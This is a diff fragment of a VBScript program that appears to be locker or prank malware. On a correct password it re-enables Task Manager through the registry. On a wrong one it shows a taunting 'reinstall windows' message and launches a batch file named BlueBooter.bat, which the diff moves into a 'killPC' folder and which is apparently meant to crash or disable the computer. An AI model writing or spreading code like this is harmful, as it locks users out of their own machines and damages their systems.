@@ -13,5 +13,5 @@ cmd.run "C:\Windows\explorer.exe"
 cmd.run "reg add HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v DisableTaskMgr /t REG_DWORD /d 0 /f"
 Else
 X=MsgBox("Incorrect so reinstall windows :)",+16,"nuh uh")
-cmd.run "C:\Users\%USERPROFILE%\Desktop\idk\BlueBooter.bat"
+cmd.run "C:\Users\%USERPROFILE%\Desktop\idk\src\killPC\BlueBooter.bat"
 End If
